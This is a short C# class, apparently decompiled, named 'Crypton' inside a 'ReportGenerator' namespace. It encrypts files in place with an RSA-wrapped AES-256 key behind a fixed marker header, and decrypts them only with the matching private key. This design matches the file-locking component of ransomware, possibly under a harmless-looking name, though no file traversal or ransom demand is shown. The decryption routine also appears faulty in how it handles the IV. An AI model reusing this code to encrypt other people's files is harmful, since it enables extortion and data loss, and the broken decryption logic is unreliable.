using System;
using System.Collections.Generic;
using System.IO;
using System.Security.Cryptography;

namespace ReportGenerator;

public class Crypton
{
	private static byte[] RSADecrypt(byte[] AESKeyAndIV, RSAParameters RSAPrivateKey)
	{
		RSA rSA = RSA.Create();
		rSA.ImportParameters(RSAPrivateKey);
		RSAPKCS1KeyExchangeDeformatter rSAPKCS1KeyExchangeDeformatter = new RSAPKCS1KeyExchangeDeformatter();
		rSAPKCS1KeyExchangeDeformatter.SetKey(rSA);
		return rSAPKCS1KeyExchangeDeformatter.DecryptKeyExchange(AESKeyAndIV);
	}

	private static byte[] RSAEncrypt(byte[] aesKey, RSAParameters rsaPub)
	{
		RSA rSA = RSA.Create();
		rSA.ImportParameters(rsaPub);
		RSAPKCS1KeyExchangeFormatter rSAPKCS1KeyExchangeFormatter = new RSAPKCS1KeyExchangeFormatter();
		rSAPKCS1KeyExchangeFormatter.SetKey(rSA);
		return rSAPKCS1KeyExchangeFormatter.CreateKeyExchange(aesKey);
	}

	private static Tuple<byte[], byte[]> EncryptAES(byte[] toEncryptAES, RSAParameters RSAPublicKey)
	{
		byte[] item = null;
		byte[] item2 = null;
		using (MemoryStream memoryStream = new MemoryStream())
		{
			using RijndaelManaged rijndaelManaged = new RijndaelManaged();
			rijndaelManaged.KeySize = 256;
			rijndaelManaged.BlockSize = 128;
			rijndaelManaged.Mode = CipherMode.CBC;
			rijndaelManaged.GenerateIV();
			rijndaelManaged.GenerateKey();
			item2 = RSAEncrypt(rijndaelManaged.Key, RSAPublicKey);
			for (int i = 0; i <= rijndaelManaged.IV.Length - 1; i++)
			{
				memoryStream.WriteByte(rijndaelManaged.IV[i]);
			}
			using (CryptoStream cryptoStream = new CryptoStream(memoryStream, rijndaelManaged.CreateEncryptor(), CryptoStreamMode.Write))
			{
				cryptoStream.Write(toEncryptAES, 0, toEncryptAES.Length);
				cryptoStream.Close();
			}
			item = memoryStream.ToArray();
		}
		return new Tuple<byte[], byte[]>(item, item2);
	}

	private static byte[] DecryptAES(byte[] DecryptAES, byte[] AESKeyAndIV, RSAParameters RSAPrivateKey)
	{
		byte[] array = RSADecrypt(AESKeyAndIV, RSAPrivateKey);
		using MemoryStream memoryStream = new MemoryStream();
		using RijndaelManaged rijndaelManaged = new RijndaelManaged();
		rijndaelManaged.KeySize = 256;
		rijndaelManaged.BlockSize = 128;
		rijndaelManaged.Key = array;
		memoryStream.Read(rijndaelManaged.IV, 0, array.Length / 2);
		rijndaelManaged.Mode = CipherMode.CBC;
		using (CryptoStream cryptoStream = new CryptoStream(memoryStream, rijndaelManaged.CreateDecryptor(), CryptoStreamMode.Write))
		{
			cryptoStream.Write(DecryptAES, 0, DecryptAES.Length);
			cryptoStream.Close();
		}
		byte[] array2 = memoryStream.ToArray();
		byte[] array3 = new byte[array2.Length - array.Length / 2];
		for (int i = array.Length / 2; i < array2.Length; i++)
		{
			array3[i - array.Length / 2] = array2[i];
		}
		return array3;
	}

	public static void DecodeFile(string filePath, RSAParameters rsaPriv)
	{
		byte[] array = File.ReadAllBytes(filePath);
		List<byte> list = new List<byte>();
		list.AddRange(array);
		byte[] aESKeyAndIV = list.GetRange(16, 512).ToArray();
		byte[] decryptAES = list.GetRange(528, array.Length - 512 - 16).ToArray();
		File.WriteAllBytes(filePath, DecryptAES(decryptAES, aESKeyAndIV, rsaPriv));
	}

	public static void EncryptFile(string filePath, RSAParameters rsaPub)
	{
		Tuple<byte[], byte[]> tuple = EncryptAES(File.ReadAllBytes(filePath), rsaPub);
		char[] array = "VON Voyage eLKai".ToCharArray();
		List<byte> list = new List<byte>();
		char[] array2 = array;
		foreach (char c in array2)
		{
			list.Add((byte)c);
		}
		byte[] item = tuple.Item2;
		foreach (byte item2 in item)
		{
			list.Add(item2);
		}
		byte[] item3 = tuple.Item1;
		foreach (byte item4 in item3)
		{
			list.Add(item4);
		}
		File.WriteAllBytes(filePath, list.ToArray());
	}
}
